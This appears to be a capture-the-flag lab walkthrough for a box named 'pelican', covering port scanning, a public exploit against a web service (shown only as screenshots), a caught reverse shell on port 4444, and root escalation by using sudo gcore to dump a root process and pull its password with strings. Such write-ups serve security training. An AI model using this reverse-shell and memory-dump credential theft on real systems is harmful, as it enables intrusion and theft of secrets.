`└─$ autonmap -H 192.168.190.98 -t recon`

`Running a recon scan on 192.168.190.98`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`139/tcp  open  netbios-ssn`
`445/tcp  open  microsoft-ds`
`631/tcp  open  ipp`
`2222/tcp open  EtherNetIP-1`
`8080/tcp open  http-proxy`
`8081/tcp open  blackice-icecap`

Checking 8080, we get access denied
Checking 8081, it redirects us to this:

![[Pasted image 20240208112048.png]]

![[Pasted image 20240208112125.png]]


On exploitdb, we see this about half way down:
![[Pasted image 20240208112209.png]]

Let's try it
![[Pasted image 20240208112324.png]]

Get the shell + upgrade it

`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:4444`
`Ncat: Listening on 0.0.0.0:4444`
`Ncat: Connection from 192.168.190.98:59026.`
`whoami`
`charles`
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
`charles@pelican:/opt/zookeeper$` 

Local flag
`charles@pelican:/opt/zookeeper$ cat ~/local.txt`
`cat ~/local.txt`
`e9d8083d72798b637fc52e48cafefe3b`

You can run linpeas and it will tell you this, it's just one thing I check real quick
Turns out the user can run gcore with sudo

`charles@pelican:/opt/zookeeper$ sudo -l`
`sudo -l`
`Matching Defaults entries for charles on pelican:`
    `env_reset, mail_badpass,`
    `secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin`

`User charles may run the following commands on pelican:`
    `(ALL) NOPASSWD: /usr/bin/gcore`

According to this https://man7.org/linux/man-pages/man1/gcore.1.html gcore is a process dumper so let's look at the processes

Use ps -eo user,pid,cmd,etime to check processes
We find an interesting one
`root       493 /usr/bin/password-store`

Dump it
`charles@pelican:/opt/zookeeper$ cd /tmp`
`cd /tmp`
`charles@pelican:/tmp$ sudo /usr/bin/gcore 493`
`sudo /usr/bin/gcore 493`
`0x00007f40ff4dd6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc48e50c90, remaining=remaining@entry=0x7ffc48e50c90) at ../sysdeps/unix/sysv/linux/nanosleep.c:28`
`28	../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.`
`Saved corefile core.493`
`[Inferior 1 (process 493) detached]`

Use strings to display it 
`charles@pelican:/tmp$ strings core.493`

We see this
`001 Password: root:`
`ClogKingpinInning731`

Su to root
`charles@pelican:/tmp$ su root`
`su root`
`Password: ClogKingpinInning731`
`root@pelican:/tmp# cat /root/proof.txt`
`cat /root/proof.txt`
`2642ed9fa8aee995678194a9c28cf239`



